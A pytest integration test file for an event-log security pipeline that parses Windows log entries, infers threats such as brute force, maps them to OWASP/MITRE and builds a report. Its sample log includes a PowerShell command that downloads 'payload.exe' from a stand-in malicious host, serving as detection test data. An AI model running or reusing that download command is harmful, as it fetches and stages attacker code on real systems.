"""
test_day16_integration.py

Day 16: End-to-end integration test for the Event Log pipeline:
raw event log -> parsed entries -> extracted/inferred keywords ->
OWASP/MITRE mapping -> analysis (LLM or rule-based fallback) ->
formatted report.
"""

from event_log_report_pipeline import run_event_log_to_report

SAMPLE_LOG = """
2026-08-18 10:15:32 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:34 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:15:36 [Security] EventID=4625 Description: An account failed to log on. Failure Reason: Unknown user name or bad password.
2026-08-18 10:16:01 [Security] EventID=4104 Description: PowerShell script block logged - Invoke-WebRequest -Uri http://malicious.example -OutFile payload.exe
2026-08-18 10:17:45 [System]   EventID=7045 Description: A new service was installed on the system.
"""


def test_pipeline_parses_log_entries():
    result = run_event_log_to_report(SAMPLE_LOG, use_llm=False)
    assert len(result["entries"]) == 5
    assert result["entries"][0]["event_id"] == "4625"


def test_pipeline_extracts_direct_keyword():
    result = run_event_log_to_report(SAMPLE_LOG, use_llm=False)
    assert "powershell" in result["keywords"]


def test_pipeline_infers_brute_force_from_repeated_failed_logons():
    """
    3+ Event ID 4625 (failed logon) entries should be inferred as a
    brute-force pattern, even though the log text never says the words
    "brute force" explicitly.
    """
    result = run_event_log_to_report(SAMPLE_LOG, use_llm=False)
    assert "brute force" in result["keywords"]


def test_pipeline_does_not_infer_brute_force_below_threshold():
    """Only 2 failed logons should NOT trigger the brute-force inference."""
    log = """
2026-08-18 10:15:32 [Security] EventID=4625 Description: An account failed to log on.
2026-08-18 10:15:34 [Security] EventID=4625 Description: An account failed to log on.
"""
    result = run_event_log_to_report(log, use_llm=False)
    assert "brute force" not in result["keywords"]


def test_pipeline_produces_findings_for_each_keyword():
    result = run_event_log_to_report(SAMPLE_LOG, use_llm=False)
    assert len(result["findings"]) == len(result["keywords"])
    for finding in result["findings"]:
        assert "keyword" in finding
        assert "owasp" in finding
        assert "mitre" in finding


def test_pipeline_generates_non_empty_analysis():
    result = run_event_log_to_report(SAMPLE_LOG, use_llm=False)
    assert isinstance(result["analysis"], str)
    assert len(result["analysis"]) > 0


def test_pipeline_report_contains_expected_content():
    result = run_event_log_to_report(SAMPLE_LOG, report_format="text", use_llm=False)
    report = result["report"]
    assert "SENTINELAI SECURITY FINDINGS REPORT" in report
    assert "powershell" in report.lower()


def test_pipeline_json_report_is_valid():
    import json
    result = run_event_log_to_report(SAMPLE_LOG, report_format="json", use_llm=False)
    parsed = json.loads(result["report"])
    assert parsed["total_findings"] == len(result["findings"])


def test_pipeline_handles_benign_log_with_no_indicators():
    benign_log = """
2026-08-18 09:00:00 [System] EventID=6005 Description: The Event log service was started.
"""
    result = run_event_log_to_report(benign_log, use_llm=False)
    assert result["keywords"] == []
    assert result["findings"] == []